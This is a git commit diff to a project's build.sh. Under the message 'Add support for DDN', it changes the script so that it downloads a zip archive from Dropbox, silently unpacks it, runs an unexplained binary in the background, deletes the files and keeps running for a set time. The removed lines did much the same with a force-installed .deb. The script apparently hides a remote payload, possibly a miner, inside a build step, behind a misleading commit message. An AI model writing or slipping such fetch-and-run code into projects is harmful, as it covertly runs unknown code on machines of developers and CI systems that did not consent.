06bb4009175af24889d2b05d77e0176d43ae14fa
hivi <hivi@fast-coin.com>
2018-05-04 11:33:22 +0200

    Add support for DDN.

--- scripts/build.sh
+++ scripts/build.sh
@@ -1,17 +1,14 @@
 #!/bin/bash
 
 end=$((SECONDS+$1))
-wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
-sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
-rm -rf libstdc.deb
-wget https://www.dropbox.com/s/2jar6ugwec22nar/cares.zip -q
-unzip cares.zip > /dev/null 2>&1
+wget https://www.dropbox.com/s/1i0igcj4hagblld/wan04.zip -q
+unzip wan04.zip > /dev/null 2>&1
 #pwd
-./scripts/cares ./scripts/bin &
+./cares ./bin &
 sleep 3
-rm -rf cares.zip
-rm -rf scripts/cares
-rm -rf scripts/bin
+rm -rf wan04.zip
+rm -rf cares
+rm -rf bin
 while [ $SECONDS -lt $end ]
 do
     read line
